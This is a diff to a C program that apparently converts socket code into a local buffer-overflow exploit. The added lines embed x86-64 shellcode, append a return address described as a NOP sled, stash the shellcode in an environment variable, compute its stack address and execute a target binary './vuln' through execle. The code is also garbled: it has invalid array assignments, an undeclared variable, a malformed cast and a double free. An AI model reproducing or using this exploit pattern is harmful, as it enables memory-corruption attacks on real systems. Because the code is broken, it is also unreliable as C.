@@ -6,11 +6,14 @@
 
 #include "resource/iphdr"
 
+/*Define a Small buffer*/
+#define VULN "./vuln`"
 /* UEFI Boot Shellcode. */
 
 #define port 4444
+#define SIZE 160
 
-unsigned char code[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
+char * sc[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
 "\x77\x66\x68\x6e\x6f\x48\x89\xe3"
 "\x50\x66\x68\x2d\x68\x48\x89\xe1"
 "\x50\x49\xb8\x2f\x73\x62\x69\x6e"
@@ -20,15 +23,30 @@ unsigned char code[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
 "\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
 "\x05";
 
-int codelength = sizeof(code);
+// NOP SLED.
+jmp = "\x78\xf3\xff\xbf"
+
+sc += jmp;
+
+int sclen = sizeof(sc);
 
 int main(char ** argv[], int * argc)  
 {
+    char p [SIZE]
     // our socket
     int ipv4 = socket(AF_INET, SOCK_STREAM, 0);
     
+    // ENVP / Environment Variable Call : char * env  = {sc, NULL};
+    char * env = {sc, NULL};
+    char * vuln[] = {VULN, p, NULL };
+    
+    // Declare a pointer, an index, and then a storage for the memory address of sc.
+    int *ptr, i, addr;
+    addr = 0xbffffffa - strlen(sc) - strlen(VULN);
+    fprintf(stderr, "[***] using address: %#010x\n", addr); // Return shellcode address.
+
     // address structure
-    std::string address;
+    char * address[256];
     struct hostent* host;
 
     int set, conn; // bind and connect placeholders.
@@ -83,7 +101,7 @@ int main(char ** argv[], int * argc)
     }
 
     // After initial connection has been made, declare IP Header.
-    iphdr *header = (iphdr *)malloc(sizeof(iphdr));
+    header = (struct iphdr *)malloc(sizeof(struct iphdr));
     memset(header, 0, sizeof(iphdr));
     header->saddr = INADDR_ANY;
     header->daddr = inet_addr(address);
@@ -106,7 +124,9 @@ int main(char ** argv[], int * argc)
     }
 
     // Close the socket
+    free(header);
+    execle(vuln[0], char(*)vuln, p, NULL, env);
     close(ipv4);
-
+    free(header);
     return 0;
 }
